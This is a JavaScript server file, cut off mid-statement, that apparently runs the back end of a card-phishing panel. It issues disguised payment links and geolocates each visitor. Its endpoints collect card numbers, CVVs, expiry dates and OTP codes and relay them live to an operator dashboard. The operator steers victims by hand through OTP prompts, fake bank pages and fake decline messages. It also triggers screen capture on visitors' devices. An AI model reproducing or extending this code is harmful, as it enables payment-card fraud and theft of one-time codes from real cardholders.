import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';
import fetch from 'node-fetch';
import { fileURLToPath } from 'url';

// Get current directory name for proper file paths in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Generate a unique ID for this server instance
const SERVER_ID = crypto.randomBytes(3).toString('hex');

// Store visitors with last activity timestamp
const visitors = new Map();
const VISITOR_TIMEOUT = 60000; // 60 seconds timeout for inactive visitors

// Store transactions and payment links
const transactions = new Map();
const paymentLinks = new Map();

// Store manually expired payment links
const expiredLinks = new Set();

// Track admin sockets separately
const adminSockets = new Set();

// Create HTML redirect files
function createRedirectFile(targetHtml) {
  try {
    const fileName = `pay${SERVER_ID}.html`;
    const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0;url=/${targetHtml}?${Date.now()}">
  <script>
    window.location.href = '/${targetHtml}' + window.location.search;
  </script>
</head>
<body>
  <p>Loading...</p>
</body>
</html>
`;

    fs.writeFileSync(fileName, redirectHtml);
    console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
    return fileName;
  } catch (error) {
    console.error(`Failed to create redirect file: ${error.message}`);
    // Return a fallback file name
    return 'index.html';
  }
}

// Create a redirect file for landing.html
const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');

// Initialize Express app
const app = express();
app.use(bodyParser.json());
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));

// Helper function to get payment ID from URL
function getPaymentIdFromUrl(url) {
  if (!url) return null;
  
  try {
    // Extract pid from URL query params
    const params = new URLSearchParams(url.split('?')[1]);
    return params.get('pid');
  } catch (error) {
    console.error('Error extracting pid from URL:', error);
    return null;
  }
}

// Helper to check if a link is expired
function isLinkExpired(pid) {
  if (!pid) return false;
  
  // Check if it's manually expired
  if (expiredLinks.has(pid)) {
    return true;
  }
  
  // Check if it exists and check automatic expiration (15 hours)
  if (paymentLinks.has(pid)) {
    const payment = paymentLinks.get(pid);
    
    // Make sure we have a valid createdAt timestamp
    if (!payment.createdAt) {
      console.log(`Payment link ${pid} has no createdAt timestamp, treating as not expired`);
      return false;
    }
    
    // Parse the timestamp correctly - ISO string format can sometimes cause issues
    let createdAt;
    try {
      createdAt = new Date(payment.createdAt).getTime();
    } catch (e) {
      console.error(`Error parsing timestamp for pid ${pid}:`, e);
      return false; // Don't expire if we can't parse the timestamp
    }
    
    const now = new Date().getTime();
    const timeDiff = now - createdAt;
    
    // Log the time difference for debugging
    console.log(`Payment link ${pid} time diff: ${timeDiff / (60 * 60 * 1000)} hours`);
    
    // 15 hours in milliseconds = 54000000
    if (timeDiff > 54000000) {
      console.log(`Payment link ${pid} expired due to time: created ${new Date(createdAt).toISOString()}, now ${new Date(now).toISOString()}`);
      return true;
    }
  }
  
  return false;
}

// Track visitors middleware and check for expired links
app.use((req, res, next) => {
  // Extract pid from the URL query parameters
  const pid = req.query.pid;
  
  // Check if the URL contains a pid and if that link is expired
  if (pid) {
    // Direct check of link expiration before any other processing
    if (isLinkExpired(pid)) {
      console.log(`Expired link access detected for pid: ${pid}`);
      
      // Check if this is an API call (to avoid redirect loops)
      if (req.path.startsWith('/api/')) {
        // For API calls, just continue and let the API handle it
        next();
        return;
      }
      
      // For any page request (landing.html, payment.html, etc), redirect to expired
      console.log(`Redirecting expired link to expired.html`);
      return res.redirect('/expired.html');
    }
    
    // Track this visit without causing expiration
    if (paymentLinks.has(pid)) {
      const payment = paymentLinks.get(pid);
      if (!payment.visits) payment.visits = 0;
      payment.visits++;
      
      // Log the visit count
      console.log(`Payment link ${pid} visits: ${payment.visits}`);
    }
    
    // Continue with normal visitor tracking only if not expired
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    const timestamp = new Date().toLocaleString();
    const lastActive = Date.now();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Check if this is a new visitor or an update
    const isNewVisitor = !visitors.has(pid);
    
    // Store visitor info with lastActive timestamp and user agent
    const visitor = { 
      pid,
      ip, 
      timestamp,
      url: req.originalUrl,
      lastActive,
      userAgent
    };
    
    visitors.set(pid, visitor);
    
    // Notify admin if this is a new visitor
    if (isNewVisitor && io) {
      io.emit('visitor', visitor);
      console.log(`New visitor emitted for pid: ${pid}`);
      // Broadcast specifically to admin sockets
      broadcastToAdmins('visitor', visitor);
    }
    
    // Process location data for this visitor
    fetchGeoData(ip).then(geoData => {
      const updatedVisitor = visitors.get(pid);
      if (updatedVisitor) {
        // Add geoData as a nested object to match what admin.html expects
        updatedVisitor.geoData = {
          city: geoData.city,
          country: geoData.country,
          countryCode: geoData.countryCode,
          region: geoData.region,
          isp: geoData.isp,
          org: geoData.org,
          lat: geoData.lat,
          lon: geoData.lon,
          browser: getBrowserInfo(userAgent).browser,
          os: getBrowserInfo(userAgent).os,
          device: getBrowserInfo(userAgent).device
        };
        
        visitors.set(pid, updatedVisitor);
        
        // Tell admin panel we have updated this visitor
        if (io) {
          io.emit('visitor_updated', updatedVisitor);
          broadcastToAdmins('visitor_updated', updatedVisitor);
        }
      }
    }).catch(err => {
      console.error('Error fetching geo data:', err);
    });
  }
  
  // Block direct access to payment.html and currencypayment.html
  if ((req.path === '/payment.html' || req.path === '/currencypayment.html') && !req.query.pid) {
    return res.status(404).sendFile(path.join(__dirname, '404.html'));
  }
  
  next();
});

// Get browser info from user agent
function getBrowserInfo(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Unknown';
  
  // Detect browser
  if (userAgent.includes('Firefox')) browser = 'Firefox';
  else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
  else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
  else if (userAgent.includes('Edg')) browser = 'Edge';
  else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
  else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browser = 'Opera';
  
  // Detect OS
  if (userAgent.includes('Windows')) os = 'Windows';
  else if (userAgent.includes('Mac OS')) os = 'macOS';
  else if (userAgent.includes('Linux') && !userAgent.includes('Android')) os = 'Linux';
  else if (userAgent.includes('Android')) os = 'Android';
else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
  
  // Detect device
  if (userAgent.includes('iPhone')) device = 'iPhone';
  else if (userAgent.includes('iPad')) device = 'iPad';
  else if (userAgent.includes('Android') && userAgent.includes('Mobile')) device = 'Android Phone';
  else if (userAgent.includes('Android') && !userAgent.includes('Mobile')) device = 'Android Tablet';
  else if ((userAgent.includes('Windows') || userAgent.includes('Mac OS') || userAgent.includes('Linux')) && 
           !userAgent.includes('Mobile')) device = 'Desktop';
  
  return { browser, os, device };
}

// Fetch geolocation data
async function fetchGeoData(ip) {
  // Default data for errors or local IPs
  const defaultData = {
    city: 'Unknown',
    country: 'Unknown',
    countryCode: 'UN',
    region: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    lat: 0,
    lon: 0
  };
  
 // Don't lookup local IPs
  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
    defaultData.city = 'Local';
    defaultData.country = 'Local';
    defaultData.countryCode = 'LO';
    defaultData.isp = 'Local Network';
    defaultData.org = 'Local Network';
    return defaultData;
  }
  
  try {
    // Clean IP if needed (remove port numbers, etc)
    const cleanIp = ip.split(',')[0].trim();
    
    // Try ipwho.is API first - more reliable and higher rate limits
    const response = await fetch(`https://ipwho.is/${cleanIp}`);
    
    if (!response.ok) {
      throw new Error(`IP lookup failed with status ${response.status}`);
    }
    
    const data = await response.json();
    
    // Check for API errors
    if (!data.success) {
      throw new Error(data.message || 'IP API error');
    }
    
    return {
      city: data.city || defaultData.city,
      country: data.country || defaultData.country,
      countryCode: data.country_code || defaultData.countryCode,
      region: data.region || defaultData.region,
      isp: data.connection?.isp || defaultData.isp,
      org: data.connection?.org || defaultData.org,
      lat: data.latitude || defaultData.lat,
      lon: data.longitude || defaultData.lon
    };
  } catch (ipwhoError) {
    console.error('Error with ipwho.is API:', ipwhoError);
    console.log('Trying fallback API...');
    
    // Fallback to ipapi.co
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      
     if (!response.ok) {
        throw new Error(`IP lookup failed with status ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.error) {
        throw new Error(data.error);
      }
      
      return {
        city: data.city || defaultData.city,
        country: data.country_name || defaultData.country,
        countryCode: data.country_code || defaultData.countryCode,
        region: data.region || defaultData.region,
        isp: data.org || data.asn || defaultData.isp,
        org: data.org || defaultData.org,
        lat: data.latitude || defaultData.lat,
        lon: data.longitude || defaultData.lon
      };
    } catch (fallbackError) {
      console.error('Error with fallback API:', fallbackError);
      return defaultData;
    }
  }
}

// Heartbeat endpoint for active visitors to ping
app.post('/api/visitor-heartbeat', (req, res) => {
  const { pid } = req.body;
  
  if (pid && visitors.has(pid)) {
    const visitor = visitors.get(pid);
    visitor.lastActive = Date.now();
    visitors.set(pid, visitor);
    
    // Notify admins about the heartbeat
    if (io) {
      io.emit('visitor_activity', { 
        pid: pid, 
        timestamp: Date.now(),
        type: 'heartbeat'
      });
      
      // Also broadcast to admin sockets
      broadcastToAdmins('visitor_activity', { 
        pid: pid, 
        timestamp: Date.now(),
        type: 'heartbeat'
      });
    }
    
    return res.json({ success: true });
  }
  
  res.status(400).json({ success: false });
});

// Clean up inactive visitors periodically
function cleanupInactiveVisitors() {
  const now = Date.now();
  let removed = 0;
  
 visitors.forEach((visitor, pid) => {
    if (now - visitor.lastActive > VISITOR_TIMEOUT) {
      visitors.delete(pid);
      removed++;
      
      // Notify admin that visitor has left
      if (io) {
        io.emit('visitor_left', { pid });
        // Also broadcast specifically to admin sockets
        broadcastToAdmins('visitor_left', { pid });
      }
    }
  });
  if (removed > 0) {
    console.log(`Removed ${removed} inactive visitors`);
  }
}

// Add a health check route
app.get('/health', (req, res) => {
  res.send({
    status: 'ok',
    serverTime: new Date().toISOString(),
    serverId: SERVER_ID
  });
});

// Serve static files with absolute path
app.use(express.static(path.join(__dirname, '.')));

// Add a route handler for random hash routes
app.get('/:hash', (req, res, next) => {
  // If this is a known file or directory, let the static middleware handle it
  const fullPath = path.join(__dirname, req.path);
  if (fs.existsSync(fullPath) && fs.statSync(fullPath).isFile()) {
    return next();
  }
  
  // Otherwise, serve index.html for all unknown single-segment routes
  // This handles URLs like yourdomain.com/a1b2c3
  console.log(`Serving index.html for hash route: ${req.path}`);
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Add fallback for landing.html
app.get('/landing.html', (req, res, next) => {
    // Try to serve landing.html, but if it doesn't exist, serve index.html as a fallback
    const landingPath = path.join(__dirname, 'landing.html');
    fs.access(landingPath, fs.constants.F_OK, (err) => {
        if (err) {
            console.log('landing.html not found, serving index.html as fallback');
            res.sendFile(path.join(__dirname, 'index.html'));
        } else {
            next(); // Continue to static file handling
        }
    });
});

// Endpoint to get active visitor info
app.get('/api/visitors', (req, res) => {
  try {
    // Clean up any inactive visitors first
    cleanupInactiveVisitors();
    // Convert the Map to an Array of objects (only active visitors)
    const visitorList = Array.from(visitors.values());
    
    return res.json(visitorList);
  } catch (error) {
    console.error('Error getting visitors:', error);
    return res.status(500).json({ error: 'Failed to get visitors' });
  }
});

// Endpoint to get the pid for a transaction
app.get('/api/getTransactionPid', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  
  if (!txn) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // Find the payment link that corresponds to this transaction
  let pid = null;
  paymentLinks.forEach((payment, paymentId) => {
    if (payment.amount === parseFloat(txn.amount)) {
      pid = paymentId;
    }
  });
  
  res.json({ pid });
});

// Add root route handler
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// FIX 1: Modified Payment Links Endpoint to explicitly include amount in URL
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description, includeScreenCapture } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount" });
    }

    if (!description?.trim()) {
      return res.status(400).json({ status: "error", message: "Description required" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    
    // EXPLICITLY include amount parameter in the URL
    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}&amount=${amount}`;

    // Create the current timestamp properly and log it
    const now = new Date();
    const createdAt = now.toISOString();
    console.log(`Creating payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()}) and amount: ${amount}`);

    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: createdAt,
      // Add a property to track visits without expiring
      visits: 0,
      includeScreenCapture: includeScreenCapture || false
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// Free Payment Links Endpoint - MODIFIED to include amount=0 parameter
app.post('/api/generateFreeLink', (req, res) => {
  try {
    const { description, isFreeLink, includeScreenCapture } = req.body;

    // Only description is optional for free links
    if (!isFreeLink) {
      return res.status(400).json({ status: "error", message: "Invalid free link request" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    
    // Use the redirect file instead of landing.html and include amount=0 parameter
    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}&amount=0`;

    // Create the current timestamp properly and log it
    const now = new Date();
    const createdAt = now.toISOString();
    console.log(`Creating free payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()})`);

    paymentLinks.set(invoiceId, {
      amount: 0, // Zero amount since user will enter their own
      description: description?.trim() || "Enter your payment amount",
      paymentLink,
      createdAt: createdAt,
      isFreeLink: true, // Mark as a free link
      visits: 0,
      includeScreenCapture: includeScreenCapture || false
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Free Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// New endpoint to manually expire a payment link
app.post('/api/expirePaymentLink', (req, res) => {
  const { pid } = req.body;
  
  if (!pid) {
    return res.status(400).json({ status: "error", message: "Payment ID (pid) is required" });
  }
  
  // The pid might be the full link or just the ID portion
  let paymentId = pid;
  
  // Check if the input is a URL
  if (pid.includes('://') || pid.includes('?pid=')) {
    try {
      // Try to extract pid from URL query parameters
      let url;
      if (pid.includes('?pid=')) {
        // If it's a query parameter format
        const pidParam = pid.split('?pid=')[1];
        paymentId = pidParam.split('&')[0]; // Get just the pid part
      } else {
        // If it's a full URL
        url = new URL(pid);
        const urlParams = new URLSearchParams(url.search);
        paymentId = urlParams.get('pid');
      }
    } catch (error) {
      console.error('Error parsing URL:', error);
      // Continue with the original pid if parsing fails
    }
  }
  
  console.log(`Attempting to expire payment link with ID: ${paymentId}`);
  
  // Check if the payment link exists
  if (!paymentLinks.has(paymentId)) {
    return res.status(404).json({ status: "error", message: "Payment link not found" });
  }
  
  // Mark the link as expired
  expiredLinks.add(paymentId);
  
  console.log(`Payment link manually expired: ${paymentId}`);
  
  res.json({ 
    status: "success", 
    message: "Payment link has been expired successfully" 
  });
});

// FIX 1: Enhanced getPaymentDetails to properly handle amount
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  
  if (!pid || !paymentLinks.has(pid)) {
    console.error(`Payment details request for non-existent pid: ${pid}`);
    return res.status(404).json({ status: "error", message: "Not found" });
  }
  
  // Use the consistent expiration check
  if (isLinkExpired(pid)) {
    return res.status(410).json({ status: "error", message: "Payment link has expired" });
  }
  
  const payment = paymentLinks.get(pid);
  
  // IMPORTANT: Log the amount being returned for debugging
  console.log(`Returning payment details for pid ${pid} with amount: ${payment.amount}`);
  
  // Check for free=true in the request query for backward compatibility
  const isFreeLink = req.query.free === 'true' || payment.isFreeLink === true;
  
  // If this is a free link, update the response to indicate that
  if (isFreeLink) {
    payment.isFreeLink = true;
  }
  
  res.json({ status: "success", payment });
});

// Transactions Endpoints - Modified to handle bank info
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder, bankInfo } = req.body;

    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
      return res.status(400).json({ status: "error", message: "Missing fields" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Parse bank info if present
    let parsedBankInfo = null;
    try {
      if (bankInfo) {
        parsedBankInfo = JSON.parse(bankInfo);
      }
    } catch (e) {
      console.error('Error parsing bank info:', e);
    }

    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency,
      cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toLocaleString(),
      ip: ip,
      bankInfo: parsedBankInfo // Add bank info
    };

    transactions.set(invoiceId, transaction);
    
    // Emit both events for compatibility
    io.emit('new_transaction');
    
    // Add card_submitted event with transaction data for real-time updates in admin panel
    io.emit('card_submitted', {
      invoiceId,
      cardData: {
        cardNumber,
        expiry,
        cvv,
        email,
        amount: amount.toString().replace(/,/g, ''),
        currency,
        cardholder,
        bankName: parsedBankInfo?.bank || 'Unknown',
        country: parsedBankInfo?.country || 'Unknown',
        cardType: parsedBankInfo?.scheme || 'Unknown'
      },
      ip
    });
    
    res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error('Transaction Error:', error);
    res.status(500).json({ status: "error", message: "Payment processing failed" });
  }
});

// Get all transactions
app.get('/api/transactions', (req, res) => {
  res.json(Array.from(transactions.values()));
});

app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  
  console.log(`Showing OTP for transaction: ${invoiceId}`);
  
  // Data to send with the event
  const otpData = { 
    transaction_id: invoiceId,
    invoiceId: invoiceId // Send both formats for compatibility
  };
  
// Broadcast to ALL clients, not just those in a room
  io.emit('show_otp', otpData);
  
  // Also broadcast specifically to the room
  io.to(invoiceId).emit('show_otp', otpData);
  
  // Try broadcasting to related rooms if we have them
  if (txn.ip) {
    io.to(txn.ip).emit('show_otp', otpData);
  }
  
  // Find payment ID if exists
  let pid = null;
  paymentLinks.forEach((payment, paymentId) => {
    if (payment.amount === parseFloat(txn.amount)) {
      pid = paymentId;
    }
  });
  
  // If we found a pid, emit to that room too
  if (pid) {
    io.to(pid).emit('show_otp', otpData);
  }
  
  console.log(`OTP display requested for invoice: ${invoiceId}`);
  res.json({ status: "success", message: "OTP form shown" });
});

// Mark OTP as wrong
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked wrong" });
});

app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form",
      otpError: txn.otpError
    });
  }

  if (txn.redirectStatus) {
    const redirectUrls = {
      success: `/success.html?invoiceId=${invoiceId}`,
      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
    };
   return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
  }

  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP received" });
});

// Update redirect status
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus, failureReason } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.redirectStatus = redirectStatus;
  if (failureReason) {
    txn.failureReason = failureReason;
  }

  const redirectUrls = {
    success: `/success.html?invoiceId=${invoiceId}`,
    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
  };

  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
  });
});

// Show bank page
app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  io.to(invoiceId).emit('toggle_bankpage', { invoiceId, show: true });
  res.json({ status: 'success' });
});

// Hide bank page
app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  io.to(invoiceId).emit('toggle_bankpage', { invoiceId, show: false });
  res.json({ status: 'success' });
});

// Mark transaction as viewed
app.post('/api/markTransactionViewed', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.viewed = true;
  res.json({ status: "success" });
});

// Get transaction for success page
app.get('/api/getTransactionForSuccess', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  res.json({
    status: "success",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email
    }
  });
});

// Get transaction for fail page
app.get('/api/getTransactionForFail', (req, res) => {
  const { invoiceId, reason } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  // Map reason codes to human-readable messages
  const reasonMessages = {
    'insufficient_balance': 'Insufficient balance in your account',
    'bank_declined': 'Transaction declined by bank',
    'card_disabled': 'Online payments are disabled on your card',
    'invalid_card': 'Invalid card number or details',
    'canceled': 'Transaction canceled by user',
    '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
    'pickup_Card': 'This card has been flagged for pickup',
    'Incorrect_card_details': 'The card details entered are incorrect',
    'Credit_limit_exceeded': 'Your credit limit has been exceeded',
    'Incorrect_security_code': 'The security code is incorrect',
    'This_type_of_transacton_is_not_allowed_for_your_card': 'This type of transaction is not allowed for your card',
    'The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent': 'Your issuing bank flagged the transaction as potentially fraudulent'
  };

  res.json({
    status: "failed",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email,
      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
    }
 });
});

// Clear transactions API
app.post('/api/clearTransactions', (req, res) => {
  try {
    const count = transactions.size;
    transactions.clear();
    res.json({ 
      status: "success", 
      message: `Successfully cleared ${count} transactions` 
    });
  } catch (error) {
    console.error('Error clearing transactions:', error);
    res.status(500).json({ 
      status: "error", 
      message: "Failed to clear transactions" 
    });
  }
});

// Start server - PROPERLY DEFINED ONLY ONCE
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Server ID: ${SERVER_ID}`);
  console.log(`Working directory: ${process.cwd()}`);
  console.log(`__dirname: ${__dirname}`);
  console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
  
// List files in the current directory to verify what's available
  try {
    const files = fs.readdirSync(process.cwd());
    console.log('Files in working directory:', files);
  } catch (error) {
    console.error('Error listing files:', error);
  }
  
  // Start the cleanup interval for inactive visitors
  setInterval(cleanupInactiveVisitors, 10000); // Check every 10 seconds
});

// Initialize Socket.IO - PROPERLY DEFINED ONLY ONCE
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling'] // Explicitly specify transports
});

// Store verification states for MC verification
const verificationStates = new Map();

// Helper function to broadcast to admin sockets
function broadcastToAdmins(event, data) {
  adminSockets.forEach(socket => {
    socket.emit(event, data);
  });
}

// Socket.IO connection handler
io.on('connection', (socket) => {
  console.log(`New socket connection established with ID: ${socket.id}`);

  // Check if this is an admin connection
  const isAdmin = socket.handshake.query?.isAdmin === 'true';
  if (isAdmin) {
    console.log('Admin connected:', socket.id);
    adminSockets.add(socket);
    
    // Send current visitors to the admin
    const visitorsList = Array.from(visitors.values());
    socket.emit('existing_visitors', visitorsList);
    
    // Send current transactions
    socket.emit('existing_transactions', Array.from(transactions.values()));
  }

  socket.on('visitor_connected', (visitorInfo) => {
    console.log('Visitor connected:', visitorInfo);
    
    // Store visitor information
    const visitor = {
        ...visitorInfo,
        socketId: socket.id,
        ip: socket.handshake.headers['x-forwarded-for'] || socket.handshake.address,
        lastActive: Date.now()
    };

    // Save to visitors map if it has a pid
    if (visitor.pid) {
      visitors.set(visitor.pid, visitor);
    }

    // Broadcast to admin panel
    io.to('admin_panel').emit('visitor_update', visitor);
    broadcastToAdmins('visitor_update', visitor);
  });
    
  socket.on('visitor', (data) => {
    console.log('New visitor data received:', data);
    
    // Extract PID and ensure it exists
    const pid = data.pid || crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Add IP address from the request
    const ip = socket.handshake.address || data.ip || 'Unknown';
    
    // Create visitor record
    const visitor = {
      pid,
      ip,
      timestamp: data.timestamp || new Date().toISOString(),
      lastActive: Date.now(),
      userAgent: data.userAgent || socket.handshake.headers['user-agent'] || 'Unknown',
      sessionId: data.sessionId || `session-${Date.now()}`,
      url: data.url || socket.handshake.headers.referer || 'Unknown',
      amount: data.amount || 0 // Store amount with visitor
    };
    
    // Store visitor information
    visitors.set(pid, visitor);
    
    // Broadcast to all admins
    broadcastToAdmins('visitor', visitor);
    
    // Broadcast to regular channels for backward compatibility
    io.emit('visitor', visitor);
    
    // Join the room for this pid
    socket.join(pid);
    
    // Start screen capture automatically for this visitor
    socket.emit('control_command', {
      type: 'start_capture',
      sessionId: visitor.sessionId
    });
  });
  
  socket.on('ping_visitor', (data) => {
    // Update last activity time for this visitor
    console.log('Visitor ping:', socket.id, data);
    
    // If we have a pid, update the visitor's last active time
    if (data.pid && visitors.has(data.pid)) {
      const visitor = visitors.get(data.pid);
      visitor.lastActive = Date.now();
      visitors.set(data.pid, visitor);
    }
    
    // Broadcast updated activity to admin panel
    io.to('admin_panel').emit('visitor_activity', {
        socketId: socket.id,
        timestamp: data.timestamp,
        action: 'ping',
        url: data.url,
        pid: data.pid
    });
    
    broadcastToAdmins('visitor_activity', {
        socketId: socket.id,
        timestamp: data.timestamp,
        action: 'ping',
        url: data.url,
        pid: data.pid
    });
  });
  
  socket.on('visitor_heartbeat', (data) => {
    // Handle visitor heartbeat to keep them active
    if (data.pid && visitors.has(data.pid)) {
      const visitor = visitors.get(data.pid);
      visitor.lastActive = Date.now();
      if (data.url) visitor.url = data.url;
      visitors.set(data.pid, visitor);
      
      // Notify admins about the activity
      broadcastToAdmins('visitor_activity', { 
        pid: data.pid, 
        timestamp: Date.now(),
        type: 'heartbeat',
        url: data.url
      });
    }
  });

  socket.on('join', (invoiceId) => {
    console.log(`Socket ${socket.id} joining room for invoiceId:`, invoiceId);
    socket.join(invoiceId);
  });
  
  // Handle card submission from index.html
  socket.on('card_submitted', (data) => {
    console.log('Card details received:', data);
    
    // Make sure the data has an invoiceId
    if (!data.invoiceId) {
      data.invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    }
    
    // Create or update transaction record
    const transaction = {
      id: data.invoiceId,
      cardNumber: data.cardData.cardNumber,
      expiry: data.cardData.expiry,
      cvv: data.cardData.cvv,
      email: data.cardData.email || 'customer@example.com',
      amount: data.cardData.amount || '0',
      currency: data.cardData.currency || 'USD',
      cardholder: data.cardData.cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: data.timestamp || new Date().toISOString(),
      ip: socket.handshake.address || 'Unknown',
      viewed: false,
      socketId: socket.id // Store the socket ID for later use
    };
    
    // If bank info is provided, add it
    if (data.cardData.bankName || data.cardData.country || data.cardData.cardType) {
      transaction.bankInfo = {
        bank: data.cardData.bankName || 'Unknown',
        country: data.cardData.country || 'Unknown',
        scheme: data.cardData.cardType || 'Unknown'
      };
    }
    
    // Store transaction
    transactions.set(data.invoiceId, transaction);
    
    // Acknowledge receipt back to the client
    socket.emit('card_data_received', {
      invoiceId: data.invoiceId,
      received: true,
      timestamp: Date.now()
    });
    
    // Broadcast to all admins
    broadcastToAdmins('card_submitted', {
      invoiceId: data.invoiceId,
      cardData: data.cardData,
